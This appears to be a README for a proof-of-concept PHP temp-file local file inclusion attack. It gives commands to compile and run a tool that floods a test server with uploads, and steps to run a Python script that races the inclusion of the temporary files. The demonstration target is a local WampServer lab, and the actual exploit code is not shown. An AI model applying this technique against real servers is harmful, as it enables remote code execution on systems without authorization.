# php-tmpfile-inclusion

## Setup

###### Compiling the hera tool (this will spam all the files)

```
g++ -std=c++11 -pthread main.cpp -o hera -lz
```

###### I used wampserver on Windows 10 to demonstrate this quickly, might want to up the max connections in Apache since it's quite low on the default installation

https://sourceforge.net/projects/wampserver/files/WampServer%203/WampServer%203.0.0/wampserver3.2.0_x64.exe/download

###### Place the test.php file on the target web server (In my case it was available at http://192.168.0.25/test.php)

###### Install timelimit (used to restart the hera tool to cycle the tmp files on the server, lazy solution)

```
sudo apt install timelimit
```

###### Edit the LocalExecPoC.py script and set the correct target host

###### Edit the hera.sh script and set the correct target host

## Reproduce attack


###### Start the hera tool

```
bash hera.sh
```

###### Start LocalExecPoC.py (This is the one that makes request and tries to do the inclusion with the tmp files)

```
time python3 LocalExecPoC.py
```
